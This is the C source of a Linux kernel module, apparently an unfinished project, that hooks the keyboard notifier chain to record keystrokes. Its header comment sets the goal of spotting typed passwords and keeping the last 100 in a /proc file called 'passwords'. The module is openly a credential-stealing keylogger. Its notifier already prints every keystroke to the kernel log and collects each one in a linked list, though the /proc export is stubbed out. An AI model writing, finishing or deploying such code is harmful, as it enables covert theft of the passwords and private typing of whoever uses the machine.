/* What we need to do:
 * 	1. The recorded keycode isn't 1:1 on the letter typed. Only record
 * 	   on the typed letter.
 * 	2. Record the last 15 characters ACTUALLY typed to the screen and
 * 	   check if it meets password rules:
 * 	   (3 of the 4: lowercase letters, uppercase letters, symbols, numbers)
 * 	3. Save a password that fits #2 in a proc file called "passwords". Save
 * 	   The last 100 potential paswords. We can use a linked list type data
 * 	   structure or just allocate a ton of space in a list of char*, probably
 * 	   go with the linked list. A linked list would have bad lookup time but
 * 	   it would be in 'order' anyways with re writing the passwords after 100
 *
 * 	-  The 2d array called 'keymap' takes [keycode][shift_boolean] to retrieve
 * 	   a letter.
 *
 * */

#include "helper.h"

#define PROC_FILE_NAME "passwords"

struct notifier_block nb;
int password_count;
bool overwrite = false;
struct password* HEAD = NULL;

// We want a reference to the password* head
// TODO create a remove / overwrite with kfree
void push(struct password** head, char* password_value){
        // 'current' is a macro :/
	struct password* curr;
	struct password* new_node;
	
	password_count++; // TODO keep an eye on the location of this.
	
	if(!overwrite){
		// Use kfree on this bad boy
		new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
		new_node->pw = password_value;
		new_node->overwrite_num = 1;
	        new_node->next = NULL;
        
		if(*head == NULL){
        	        *head = new_node;
        	        return;
        	}

        	curr = *head;
        	while(curr->next != NULL){
        	        curr = curr->next;
        	}
        	curr->next = new_node;

		if(password_count == 100){
			new_node->next = *head;
			overwrite = true;
		}
	
	}else{
		// Iterate until we find the next node for overwriting
		curr = *head;
		if(password_count % 100 == 1){ // Should be at head again.
			curr->pw = password_value;
			curr->overwrite_num++;
			return;
		}
		while(curr->overwrite_num == curr->next->overwrite_num){
			curr = curr->next;
		} // Brings curr to the last written node before this push call

		curr->next->pw = password_value;
		curr->next->overwrite_num++;
	}

}

void ll_destructor(struct password** head){
	struct password* next;
	struct password* curr;
	
	if(*head == NULL){
		return;
	}

	curr = *head;
	while(curr != NULL){
		next = curr->next;
		kfree(curr);
		curr = next;
	}
}


ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp ) {
	return 0;
}

struct file_operations proc_fops = {
	read: read_password,
};

int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
//	printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
	if(kp->value > 119) return 0;
	// keymap[][] returns a char* since you can have names like '_BACKSPACE_'
	printk("Letter: %s\n", keymap[kp->value][kp->shift]);
	push(&HEAD, keymap[kp->value][kp->shift]);
	printk("Number of passwords: %d\n", password_count);
	
	return 0;
}

int init (void) {
	password_count = 0;
	
	nb.notifier_call = kb_notifier_fn;
	register_keyboard_notifier(&nb);
	// proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
	return 0;
}

void cleanup(void) {
	unregister_keyboard_notifier(&nb);
	ll_destructor(&HEAD);
	// remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE("GPL"); 
module_init(init);
module_exit(cleanup);

